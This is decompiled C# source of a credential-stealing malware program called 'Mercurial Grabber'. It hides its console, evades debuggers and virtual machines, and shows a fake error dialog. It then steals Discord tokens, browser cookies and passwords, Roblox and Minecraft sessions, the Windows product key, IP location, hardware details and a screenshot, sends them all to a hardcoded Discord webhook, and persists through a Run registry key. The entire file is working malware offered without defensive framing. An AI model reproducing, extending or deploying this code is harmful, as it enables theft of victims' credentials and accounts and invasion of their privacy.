using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x06000002 RID: 2
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000003 RID: 3 RVA: 0x00002068 File Offset: 0x00000268
		private static void Main()
		{
			Program.HideConsole();
			try
			{
				Program.DetectDebug();
			}
			catch
			{
				Console.WriteLine("Error in Anti Debug, Check Debug");
			}
			try
			{
				Program.DetectRegistry();
			}
			catch
			{
				Console.WriteLine("Error in Anti VM , Check Registry");
			}
			new Thread(delegate()
			{
				MessageBox.Show("Une Erreur est survenu lors du l'ancement du fichier", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}).Start();
			Program.GrabIP();
			Program.GrabToken();
			Program.GrabProduct();
			Program.GrabHardware();
			Browser.StealCookies();
			Browser.StealPasswords();
			Program.Minecraft();
			Program.Roblox();
			Program.CaptureScreen();
			Program.StartUp();
			Console.WriteLine("Task complete");
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002124 File Offset: 0x00000324
		private static void HideConsole()
		{
			IntPtr consoleWindow = Program.GetConsoleWindow();
			Program.ShowWindow(consoleWindow, 0);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000213F File Offset: 0x0000033F
		private static void DetectDebug()
		{
			if (!Debugger.IsAttached)
			{
				return;
			}
			Environment.Exit(0);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002150 File Offset: 0x00000350
		private static void DetectRegistry()
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>
			{
				"vmware",
				"virtualbox",
				"vbox",
				"qemu",
				"xen"
			};
			string[] array = new string[]
			{
				"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier",
				"SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
				"SYSTEM\\CurrentControlSet\\Control\\CriticalDeviceDatabase\\root#vmwvmcihostdev",
				"SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers",
				"SOFTWARE\\VMWare, Inc.\\VMWare Tools",
				"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
				"HARDWARE\\ACPI\\DSDT\\VBOX_"
			};
			string[] array2 = new string[]
			{
				"SYSTEM\\ControlSet001\\Services\\Disk\\Enum\\0",
				"HARDWARE\\Description\\System\\SystemBiosInformation",
				"HARDWARE\\Description\\System\\VideoBiosVersion",
				"HARDWARE\\Description\\System\\SystemManufacturer",
				"HARDWARE\\Description\\System\\SystemProductName",
				"HARDWARE\\Description\\System\\Logical Unit Id 0"
			};
			foreach (string text in array)
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text, false);
				if (registryKey != null)
				{
					list.Add("HKLM:\\" + text);
				}
			}
			foreach (string text2 in array2)
			{
				string name = new DirectoryInfo(text2).Name;
				string text3 = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(text2), false).GetValue(name);
				foreach (string text4 in list2)
				{
					if (!string.IsNullOrEmpty(text3) && text3.ToLower().Contains(text4.ToLower()))
					{
						list.Add("HKLM:\\" + text2 + " => " + text3);
					}
				}
			}
			if (list.Count == 0)
			{
				return;
			}
			Environment.Exit(0);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x0000234C File Offset: 0x0000054C
		public static void Roblox()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
				{
					string text = registryKey.GetValue(".ROBLOSECURITY").ToString();
					text = text.Substring(46).Trim(new char[]
					{
						'>'
					});
					Console.WriteLine(text);
					Program.wh.SendContent(WebhookContent.RobloxCookie(text));
				}
			}
			catch (Exception ex)
			{
				Program.wh.SendContent(WebhookContent.SimpleMessage("Roblox Cookie", "Unable to find cookie from Roblox Studio registry"));
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002400 File Offset: 0x00000600
		public static void StartUp()
		{
			try
			{
				string text = Process.GetCurrentProcess().ProcessName + ".exe";
				string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
				File.Copy(sourceFileName, Path.GetTempPath() + text);
				string str = Path.GetTempPath() + text;
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
				{
					registryKey.SetValue("Mercurial Grabber", "\"" + str + "\"");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000024B4 File Offset: 0x000006B4
		private static void Minecraft()
		{
			string text = User.appData + "\\.minecraft\\launcher_profiles.json";
			Console.WriteLine(text);
			Console.WriteLine("copy to : " + User.tempFolder + "\\launcher_profiles.json");
			if (File.Exists(text))
			{
				File.Copy(text, User.tempFolder + "\\launcher_profiles.json");
				Program.wh.SendData("Minecraft Session Profiles", "launcher_profiles.json", User.tempFolder + "\\launcher_profiles.json", "multipart/form-data");
			}
			else
			{
				Program.wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_profiles.json"));
			}
			string text2 = User.appData + "\\.minecraft\\launcher_accounts.json";
			Console.WriteLine(text2);
			Console.WriteLine("copy to : " + User.tempFolder + "\\launcher_accounts.json");
			if (File.Exists(text2))
			{
				File.Copy(text2, User.tempFolder + "\\launcher_accounts.json");
				Program.wh.SendData("Minecraft Session Profiles", "launcher_accounts.json", User.tempFolder + "\\launcher_accounts.json", "multipart/form-data");
				return;
			}
			Program.wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_accounts.json"));
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000025E0 File Offset: 0x000007E0
		private static void CaptureScreen()
		{
			Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
			Rectangle bounds = Screen.AllScreens[0].Bounds;
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
			bitmap.Save(Program.tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
			Program.wh.SendData("", "Capture.jpg", Program.tempFolder + "\\Capture.jpg", "multipart/form-data");
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002690 File Offset: 0x00000890
		private static void GrabToken()
		{
			List<string> list = Grabber.Grab();
			foreach (string text in list)
			{
				Token token = new Token(text);
				string content = WebhookContent.Token(token.email, token.phoneNumber, text, token.fullUsername, token.avatarUrl, token.locale, token.creationDate, token.userId);
				Program.wh.SendContent(content);
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002724 File Offset: 0x00000924
		private static void GrabProduct()
		{
			Program.wh.SendContent(WebhookContent.ProductKey(Windows.GetProductKey()));
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000273C File Offset: 0x0000093C
		private static void GrabIP()
		{
			IP ip = new IP();
			ip.GetIPGeo();
			Program.wh.SendContent(WebhookContent.IP(ip.ip, ip.country, ip.GetCountryIcon(), ip.regionName, ip.city, ip.zip, ip.isp));
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002790 File Offset: 0x00000990
		private static void GrabHardware()
		{
			Machine machine = new Machine();
			Program.wh.SendContent(WebhookContent.Hardware(machine.osName, machine.osArchitecture, machine.osVersion, machine.processName, machine.gpuVideo, machine.gpuVersion, machine.diskDetails, machine.pcMemory));
		}

		// Token: 0x04000001 RID: 1
		private const int SW_HIDE = 0;

		// Token: 0x04000002 RID: 2
		private const int SW_SHOW = 5;

		// Token: 0x04000003 RID: 3
		public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000004 RID: 4
		public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");

		// Token: 0x04000005 RID: 5
		public static Webhook wh = new Webhook("https://discordapp.com/api/webhooks/937128525322911795/CuDssh-BG3fDXR7ZQfQHRh5nJtuQN6IySDBOr0uxq784pBRZkI5pDZ-jbDw7r5rmwe0L");
	}
}
